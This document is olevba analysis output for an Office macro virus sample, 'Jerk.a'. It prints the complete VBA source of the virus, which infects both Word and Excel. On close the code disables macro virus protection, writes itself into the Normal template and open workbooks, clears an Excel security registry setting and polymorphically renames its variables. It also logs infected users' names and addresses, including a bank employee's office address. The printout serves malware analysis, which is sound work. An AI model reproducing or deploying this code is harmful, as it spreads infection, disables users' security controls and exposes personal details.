olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.a-fb8efca0baf16502cf207007565f9336daff7425
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.a-fb8efca0baf16502cf207007565f9336daff7425 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 03:35:44: PM - Wednesday, 3 Nov 1999
' test1
'


' 09:42:51: AM - Wednesday, 27 Oct 1999
' test1
'


' 03:50:45: PM - Tuesday, 26 Oct 1999
' test1
'


' 03:17:12: PM - Tuesday, 26 Oct 1999
' test1
'


' 03:15:26: PM - Tuesday, 26 Oct 1999
' test1
'


' 03:13:55: PM - Tuesday, 26 Oct 1999
' test1
'


' 04:28:25: PM - Monday, 25 Oct 1999
' test1
'


' 04:27:42: PM - Monday, 25 Oct 1999
' test1
'


' 04:27:30: PM - Monday, 25 Oct 1999
' test1
'


' 04:27:01: PM - Monday, 25 Oct 1999
' test1
'


' 04:23:24: PM - Monday, 25 Oct 1999
' test1
'


' 02:06:02: PM - Thursday, 30 Sep 1999
' test1
'


' 02:06:02: PM - Thursday, 30 Sep 1999
' test1
'


' 12:28:49: PM - Thursday, 30 Sep 1999
' test1
'


' 04:43:36: PM - Monday, 27 Sep 1999
' test1
'


' 04:38:50: PM - Monday, 27 Sep 1999
' test1
'


' 04:38:00: PM - Monday, 27 Sep 1999
' test1
'


' 11:23:40: AM - Monday, 27 Sep 1999
' test1
'


' 10:49:28: AM - Monday, 27 Sep 1999
' test1
'


' 10:47:24: AM - Monday, 27 Sep 1999
' test1
'


' 01:35:46: PM - Thursday, 23 Sep 1999
' test1
'


' 11:48:03: AM - Thursday, 23 Sep 1999
' test1
'


' 10:38:32: AM - Thursday, 23 Sep 1999
' test1
'


' 10:36:18: AM - Thursday, 23 Sep 1999
' test1
'


' 09:48:01: AM - Thursday, 23 Sep 1999
' test1
'


' 04:48:48: PM - Wednesday, 22 Sep 1999
' test1
'


' 04:46:38: PM - Wednesday, 22 Sep 1999
' test1
'


' 04:45:25: PM - Wednesday, 22 Sep 1999
' test1
'


' 04:41:46: PM - Wednesday, 22 Sep 1999
' test1
'


' 04:41:23: PM - Wednesday, 22 Sep 1999
' test1
'


' 03:58:12: PM - Wednesday, 22 Sep 1999
' test1
'


' 03:25:18: PM - Wednesday, 22 Sep 1999
' test1
'


' 12:58:05: PM - Monday, 20 Sep 1999
' test1
'


' 12:58:00: PM - Monday, 20 Sep 1999
' test1
'

































Private Sub Workbook_Deactivate()
On Error Resume Next
Const XCXJK = 1, NZHURWVVSO = True, CVNVHPTEPTAIK = False, UDVJWGVQPPLCJEL = 0
Dim EUUIOTDYTDE, SRWUSICW As String
Dim XYNBHYC, ZHFKSZSLZVG As Integer
Dim VWDFNFBVOQJ As Boolean
SRWUSICW = "ThisWorkbook"
EUUIOTDYTDE = Application.ThisWorkbook.VBProject.VBComponents.Item(XCXJK).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(XCXJK).CodeModule.CountOfLines)
Call KXSIWWYREH(EUUIOTDYTDE)
For XYNBHYC = XCXJK To Application.Workbooks.Count
VWDFNFBVOQJ = CVNVHPTEPTAIK
For ZHFKSZSLZVG = XCXJK To Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Count
If Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.CountOfLines = UDVJWGVQPPLCJEL Then
If Application.Workbooks.Item(XYNBHYC).Path <> "" And Application.Workbooks.Item(XYNBHYC).Saved = NZHURWVVSO And VWDFNFBVOQJ = CVNVHPTEPTAIK Then VWDFNFBVOQJ = NZHURWVVSO
Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.InsertLines XCXJK, EUUIOTDYTDE
If Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).Name = SRWUSICW Then
Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.ReplaceLine XCXJK * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.ReplaceLine XCXJK * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next ZHFKSZSLZVG
If VWDFNFBVOQJ = NZHURWVVSO Then Application.Workbooks.Item(XYNBHYC).Save
Next XYNBHYC
End Sub
Private Sub Document_Close()
On Error Resume Next
Const NZHURWVVSO = True, CVNVHPTEPTAIK = False, UDVJWGVQPPLCJEL = 0, XCXJK = 1, BFWFEOG = wdFormatDocument, SASLUMQF = wdFormatTemplate, LNJXPCQJQA = ":"
Dim VWDFNFBVOQJ, MIGDRZAV, HFBUJBNUNEPPI, RDSRLHTEQD As Boolean
Dim FUCNTK, KQMSAWZSTQ As Object
Dim CXEZUUWDVJ, EUUIOTDYTDE As String
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
Set FUCNTK = ActiveDocument.VBProject.VBComponents.Item(XCXJK)
Set KQMSAWZSTQ = NormalTemplate.VBProject.VBComponents.Item(XCXJK)
Randomize
HFBUJBNUNEPPI = CVNVHPTEPTAIK
RDSRLHTEQD = CVNVHPTEPTAIK
If FUCNTK.CodeModule.CountOfLines <> UDVJWGVQPPLCJEL Then HFBUJBNUNEPPI = NZHURWVVSO
If KQMSAWZSTQ.CodeModule.CountOfLines <> UDVJWGVQPPLCJEL Then RDSRLHTEQD = NZHURWVVSO
Options.VirusProtection = CVNVHPTEPTAIK
If (HFBUJBNUNEPPI = NZHURWVVSO Xor RDSRLHTEQD = NZHURWVVSO) And (ActiveDocument.SaveFormat = BFWFEOG Or ActiveDocument.SaveFormat = SASLUMQF) Then
If HFBUJBNUNEPPI = NZHURWVVSO Then
MIGDRZAV = NormalTemplate.Saved
EUUIOTDYTDE = FUCNTK.CodeModule.Lines(XCXJK, FUCNTK.CodeModule.CountOfLines)
Call WMCZIPLWVRRBWD(EUUIOTDYTDE)
If Int(Rnd * 10 * XCXJK) = XCXJK * 7 Then Call FVJFIEJBFF(EUUIOTDYTDE)
Call FYVAIANHNTAIGJW(EUUIOTDYTDE)
KQMSAWZSTQ.CodeModule.InsertLines XCXJK, EUUIOTDYTDE
If MIGDRZAV = NZHURWVVSO Then NormalTemplate.Save
End If
CXEZUUWDVJ = Mid(ActiveDocument.FullName, 2, XCXJK)
If RDSRLHTEQD = NZHURWVVSO And (CXEZUUWDVJ = LNJXPCQJQA Or ActiveDocument.Saved = CVNVHPTEPTAIK) Then
VWDFNFBVOQJ = ActiveDocument.Saved
EUUIOTDYTDE = KQMSAWZSTQ.CodeModule.Lines(XCXJK, KQMSAWZSTQ.CodeModule.CountOfLines)
Call FYVAIANHNTAIGJW(EUUIOTDYTDE)
FUCNTK.CodeModule.InsertLines XCXJK, EUUIOTDYTDE
If VWDFNFBVOQJ = NZHURWVVSO Then ActiveDocument.Save
End If
End If
End Sub
Private Sub FVJFIEJBFF(ByRef EUUIOTDYTDE As String)
On Error Resume Next
Const OOXRYSNS = 48, RNFYDFFZ = 15, VPDQY = 5, WHRQXHQEKQBTHJ = 65, ROWBEEV = 90, XCXJK = 1, NZHURWVVSO = True, CVNVHPTEPTAIK = False
Dim EGZJJSSBTI, KHCQMGSDTmp, ATSLUNOOI, KHCQMGSD(XCXJK To OOXRYSNS), KHCQMGSD2(XCXJK To OOXRYSNS) As String
Dim XYNBHYC, ZHFKSZSLZVG, NBEZXGBLOIZOZ As Integer
Dim PCGVEG As Boolean
EGZJJSSBTI = "EUUIOTDYTDE OOXRYSNS KHCQMGSD KHCQMGSD2 ATSLUNOOI XYNBHYC ZHFKSZSLZVG NBEZXGBLOIZOZ PCGVEG FVJFIEJBFF RNFYDFFZ VPDQY WHRQXHQEKQBTHJ ROWBEEV XCXJK EGZJJSSBTI KHCQMGSDTmp VWDFNFBVOQJ MIGDRZAV HFBUJBNUNEPPI RDSRLHTEQD FUCNTK KQMSAWZSTQ WMCZIPLWVRRBWD BWHCN RWPUM RGJFCIJR IJTXVMWVT BWHCNTmp OWFEPAEJGPBHYE GAOYQCQCKRT CXEZUUWDVJ NZHURWVVSO CVNVHPTEPTAIK UDVJWGVQPPLCJEL BFWFEOG SASLUMQF SIGBYZ NHDROOBYB LNJXPCQJQA AXRCRV ECBSZNKW SRWUSICW KXSIWWYREH FYVAIANHNTAIGJW CBLLBPRHCYL AOXZMEGIJZRSJR JVEVRTDWYFH"
Randomize
ZHFKSZSLZVG = XCXJK
For XYNBHYC = XCXJK To Len(EGZJJSSBTI)
If Mid(EGZJJSSBTI, XYNBHYC, XCXJK) = " " Or XYNBHYC = Len(EGZJJSSBTI) Then
If XYNBHYC = Len(EGZJJSSBTI) Then KHCQMGSDTmp = KHCQMGSDTmp & Mid(EGZJJSSBTI, XYNBHYC, XCXJK)
For NBEZXGBLOIZOZ = XCXJK To Int((RNFYDFFZ - VPDQY + XCXJK) * Rnd + VPDQY)
KHCQMGSD2(ZHFKSZSLZVG) = KHCQMGSD2(ZHFKSZSLZVG) & Chr(Int((ROWBEEV - WHRQXHQEKQBTHJ + XCXJK) * Rnd + WHRQXHQEKQBTHJ))
Next NBEZXGBLOIZOZ
KHCQMGSD(ZHFKSZSLZVG) = KHCQMGSDTmp
KHCQMGSDTmp = ""
ZHFKSZSLZVG = ZHFKSZSLZVG + XCXJK
Else
KHCQMGSDTmp = KHCQMGSDTmp & Mid(EGZJJSSBTI, XYNBHYC, XCXJK)
End If
Next XYNBHYC
PCGVEG = CVNVHPTEPTAIK
For XYNBHYC = XCXJK To Len(EUUIOTDYTDE)
For ZHFKSZSLZVG = XCXJK To OOXRYSNS
If Mid(EUUIOTDYTDE, XYNBHYC, Len(KHCQMGSD(ZHFKSZSLZVG))) = KHCQMGSD(ZHFKSZSLZVG) Then
ATSLUNOOI = ATSLUNOOI & KHCQMGSD2(ZHFKSZSLZVG)
XYNBHYC = XYNBHYC + Len(KHCQMGSD(ZHFKSZSLZVG)) - XCXJK
PCGVEG = NZHURWVVSO
Exit For
End If
Next ZHFKSZSLZVG
If PCGVEG = CVNVHPTEPTAIK Then
ATSLUNOOI = ATSLUNOOI & Mid(EUUIOTDYTDE, XYNBHYC, XCXJK)
Else
PCGVEG = CVNVHPTEPTAIK
End If
Next XYNBHYC
EUUIOTDYTDE = ATSLUNOOI
End Sub
Private Sub WMCZIPLWVRRBWD(ByRef EUUIOTDYTDE As String)
On Error Resume Next
Const IJTXVMWVT = "' ", XCXJK = 1
Const SIGBYZ = "hh:mm:ss: AMPM - ", NHDROOBYB = "dddd, d mmm yyyy"
Dim BWHCNTmp, BWHCN, OWFEPAEJGPBHYE, GAOYQCQCKRT, RWPUM, RGJFCIJR As String
Dim XYNBHYC As Integer
RWPUM = Chr(10 * XCXJK + 3)
BWHCN = Application.UserAddress
GAOYQCQCKRT = Format(Time, SIGBYZ) & Format(Date, NHDROOBYB)
RGJFCIJR = Chr(XCXJK * 10)
OWFEPAEJGPBHYE = Application.UserName
For XYNBHYC = XCXJK To Len(BWHCN)
If Mid(BWHCN, XYNBHYC, XCXJK) <> RWPUM Then
If Mid(BWHCN, XYNBHYC, XCXJK) <> RGJFCIJR Then
BWHCNTmp = BWHCNTmp & Mid(BWHCN, XYNBHYC, XCXJK)
End If
Else
BWHCNTmp = BWHCNTmp & RWPUM & IJTXVMWVT
End If
Next XYNBHYC
EUUIOTDYTDE = EUUIOTDYTDE & RWPUM & IJTXVMWVT & GAOYQCQCKRT & RWPUM & IJTXVMWVT & OWFEPAEJGPBHYE & RWPUM & IJTXVMWVT & BWHCN & RWPUM
End Sub
Private Sub FYVAIANHNTAIGJW(ByVal EUUIOTDYTDE As String)
On Error Resume Next
Dim JVEVRTDWYFH As Long
Dim AXRCRV As Object
Dim CBLLBPRHCYL, AOXZMEGIJZRSJR As String
CBLLBPRHCYL = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
JVEVRTDWYFH = &H0
AOXZMEGIJZRSJR = "Options6"
System.PrivateProfileString("", CBLLBPRHCYL, AOXZMEGIJZRSJR) = JVEVRTDWYFH
Set AXRCRV = GetObject(, "Excel.Application")
Const XCXJK = 1, UDVJWGVQPPLCJEL = 0
Dim SRWUSICW As String
Dim XYNBHYC, ZHFKSZSLZVG As Integer
SRWUSICW = "ThisWorkbook"
For XYNBHYC = XCXJK To AXRCRV.Application.Workbooks.Count
For ZHFKSZSLZVG = XCXJK To AXRCRV.Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Count
If AXRCRV.Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.CountOfLines = UDVJWGVQPPLCJEL Then
AXRCRV.Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.InsertLines XCXJK, EUUIOTDYTDE
If AXRCRV.Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).Name = SRWUSICW Then
AXRCRV.Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.ReplaceLine 33 * XCXJK, "Private Sub Workbook_Deactivate()"
Else
AXRCRV.Application.Workbooks.Item(XYNBHYC).VBProject.VBComponents.Item(ZHFKSZSLZVG).CodeModule.ReplaceLine XCXJK * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next ZHFKSZSLZVG
Next XYNBHYC
Set AXRCRV = Nothing
End Sub
Private Sub KXSIWWYREH(ByVal EUUIOTDYTDE As String)
On Error Resume Next
Const NZHURWVVSO = True, CVNVHPTEPTAIK = False, XCXJK = 1, UDVJWGVQPPLCJEL = 0
Dim ECBSZNKW As Object
Dim MIGDRZAV As Boolean
Set ECBSZNKW = GetObject(, "Word.Application")
If ECBSZNKW.NormalTemplate.VBProject.VBComponents.Item(XCXJK).CodeModule.CountOfLines = UDVJWGVQPPLCJEL Then
MIGDRZAV = ECBSZNKW.NormalTemplate.Saved
ECBSZNKW.Options.VirusProtection = CVNVHPTEPTAIK
ECBSZNKW.NormalTemplate.VBProject.VBComponents.Item(XCXJK).CodeModule.InsertLines XCXJK, EUUIOTDYTDE
If MIGDRZAV = NZHURWVVSO Then ECBSZNKW.NormalTemplate.Save
End If
Set ECBSZNKW = Nothing
End Sub

' 03:30:06: PM - Monday, 8 Feb 1999
' Bonitz
'

' 01:34:37: AM - Wednesday, 3 Mar 1999
' Kathy Bonitz
'

' 04:54:43: PM - Monday, 8 Mar 1999
' CHRISTINEHENRIOULLE
'

' 09:16:09: PM - Monday, 15 Mar 1999
' Jeff Brock
'

' 01:40:29: PM - Wednesday, 24 Mar 1999
' John Sullivan
'

' 01:29:22: PM - Friday, 2 Apr 1999
' vghiglio
'

' 08:37:25: AM - Monday, 19 Apr 1999
' John Sullivan
'

' 08:42:04: AM - Tuesday, 20 Apr 1999
' bcevallo
'

' 03:01:20: PM - Thursday, 29 Apr 1999
' Stephanie KwaiJun Dang
' Stephanie Dang
Relationship Service Manager
Citicorp, North America
One Sansome Street, 26th Floor
San Francisco, CA  9410

' 08:58:57: AM - Tuesday, 4 May 1999
' rida
'

' 04:37:03: PM - Friday, 17 Sep 1999
' test1
'

' 02:37:02: PM - Friday, 12 Nov 1999
' Citicorp and
'

' 04:03:42: PM - Wednesday, 17 Nov 1999
' Rosalind Cooper
'

' 11:25:48: AM - Friday, 19 Nov 1999
' Loretta Abate
'

' 02:02:09: PM - Friday, 19 Nov 1999
' Cora Leute
'

' 05:04:32: PM - Tuesday, 23 Nov 1999
' Joan Caridi
'

' 10:14:13: AM - Tuesday, 30 Nov 1999
' NSTRAMAN
'

' 12:21:22: PM - Wednesday, 1 Dec 1999
' Amanda Bath
'

' 11:26:43: AM - Thursday, 2 Dec 1999
' Amanda Bath
'

' 05:37:49: PM - Monday, 6 Dec 1999
' Kplummer
'

' 10:56:50:  - Tuesday, 7 Dec 1999
' Rachel Firmani
'

' 10:49:45: PM - Tuesday, 7 Dec 1999
' agalliano
'

' 01:32:01: PM - Wednesday, 8 Dec 1999
' smerlino
'

' 06:20:13: PM - Monday, 20 Dec 1999
' Avert
'

' 11:14:36:  - Dienstag, 6 Mrz 2001
' Andreas Marx
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

